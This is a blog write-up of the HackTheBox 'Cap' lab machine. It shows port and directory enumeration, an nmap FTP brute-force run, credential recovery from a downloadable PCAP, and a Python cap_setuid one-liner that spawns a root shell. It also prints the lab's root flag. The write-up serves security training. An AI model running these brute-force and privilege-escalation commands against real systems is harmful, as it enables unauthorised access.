---
layout: post
title: "Cap Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Cap

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/ 10.129.159.192 folder that I have attached to this post.

## Enumeration summary

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)

80/tcp open  http    gunicorn

```

```
Summary   : JQuery[2.2.4], Bootstrap, Script, X-UA-Compatible[ie=edge], HTML5, Modernizr[2.8.3.min], HTTPServer[gunicorn]

```

```
/data                 (Status: 302) [Size: 208] [--> http://10.129.159.192/]

/ip                   (Status: 200) [Size: 17442]

/netstat              (Status: 200) [Size: 29628]

/capture              (Status: 302) [Size: 220] [--> http://10.129.159.192/data/1]
```

```
|     Path: http://10.129.159.192:80/static/css/owl.carousel.min.css
|     Line number: 1
|     Comment:
|         /**
|          * Owl Carousel v2.2.1
|          * Copyright 2013-2017 David Deutsch
|          * Licensed under  ()
|          */
```

```
─$ nmap --script ftp-brute -p 21 10.129.159.192
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 07:01 EDT
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for cap.htb (10.129.159.192)
Host is up (0.012s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute:
|   Accounts: No valid accounts found
|_  Statistics: Performed 3734 guesses in 602 seconds, average tps: 6.0

Nmap done: 1 IP address (1 host up) scanned in 602.51 seconds

```

## Exploitation

Start wireshark for tun0 and go to http://cap.htb/data/0. Download the PCAP and you’ll find this:

![image-20210610135344295.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210610135344295.png)

Login ssh and ftp:

![image-20210610135409225.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210610135409225.png)

## Privesc time

Lnpeas is the way to go here:

```
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 5.4.0-73-generic (buildd@lcy01-amd64-019) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.2 LTS
Release:    20.04
Codename:   focal

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31

```

```
[+] Unmounted file-system?
[i] Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-2om9fd1B3Q2r7E8yJyxwbZF4JCSUIQCqYgbAERHfSMVI2q5K9TyUTeGzFxbyZN4a / ext4 defaults 0 0
/dev/disk/by-uuid/d3d1cf9e-20c6-450f-b152-9854f6a804ad /boot ext4 defaults 0 0
/dev/sda4   none    swap    sw  0   0
proc    /proc   proc    defaults,hidepid=2  0   0

```

```
[+] Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

```

```
[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilitiesFiles with capabilities (limited to 50):/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip/usr/bin/ping = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The last one allows us to change our UID, aka make us root:

```
nathan@cap:/$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'root@cap:/# whoamirootroot@cap:/# pwd/root@cap:/# cd rootroot@cap:/root# dirroot.txt  snaproot@cap:/root# cat root.txtc336a24678a2b18b959c74e790382a0broot@cap:/root#
```

## Final thoughts

Nice 20 pointer.
